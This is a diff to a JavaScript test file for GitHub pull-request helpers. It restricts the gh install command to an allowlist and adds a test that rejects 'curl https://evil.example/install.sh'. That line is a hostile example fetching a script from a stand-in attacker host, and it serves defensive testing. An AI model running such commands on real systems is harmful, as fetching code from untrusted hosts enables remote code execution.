@@ -72,7 +72,7 @@ describe('github helpers', () => {
     );
   });
 
-  it('createPullRequest installs gh with GH_INSTALL_COMMAND when missing', async () => {
+  it('createPullRequest installs gh with allowlisted GH_INSTALL_COMMAND when missing', async () => {
     let ghVersionChecks = 0;
     execFileMock.mockImplementation((command, args, _options, callback) => {
       const key = `${command} ${(args || []).join(' ')}`;
@@ -84,7 +84,7 @@ describe('github helpers', () => {
         }
         return callback(null, 'gh version 2.0.0', '');
       }
-      if (key === 'sh -lc npm i -g gh') return callback(null, '', '');
+      if (key === 'brew install gh') return callback(null, '', '');
       if (key === 'gh auth status --hostname github.com') return callback(null, 'ok', '');
       if (key.includes('gh pr create')) return callback(null, 'https://github.com/octo-org/hello-world/pull/2\n', '');
       return callback(new Error(`Unexpected command: ${key}`), '', '');
@@ -92,7 +92,7 @@ describe('github helpers', () => {
 
     const pr = await createPullRequest({
       cwd: '/repo',
-      ghInstallCommand: 'npm i -g gh',
+      ghInstallCommand: 'brew install gh',
       title: 'Add feature',
       head: 'feature',
       base: 'main',
@@ -100,11 +100,32 @@ describe('github helpers', () => {
 
     expect(pr).toEqual({ html_url: 'https://github.com/octo-org/hello-world/pull/2' });
     expect(execFileMock).toHaveBeenCalledWith(
-      'sh',
-      ['-lc', 'npm i -g gh'],
+      'brew',
+      ['install', 'gh'],
       { cwd: '/repo' },
       expect.any(Function)
     );
+  });
+
+  it('rejects non-allowlisted GH_INSTALL_COMMAND values', async () => {
+    execFileMock.mockImplementation((command, args, _options, callback) => {
+      const key = `${command} ${(args || []).join(' ')}`;
+      if (key === 'gh --version') {
+        const error = Object.assign(new Error('not found'), { code: 'ENOENT' });
+        return callback(error, '', '');
+      }
+      return callback(new Error(`Unexpected command: ${key}`), '', '');
+    });
+
+    await expect(() =>
+      createPullRequest({
+        cwd: '/repo',
+        ghInstallCommand: 'curl https://evil.example/install.sh',
+        title: 'Add feature',
+        head: 'feature',
+        base: 'main',
+      })
+    ).rejects.toThrow('GH_INSTALL_COMMAND is not allowlisted');
   });
 
   it('createPullRequest throws a login hint when gh auth is missing', async () => {
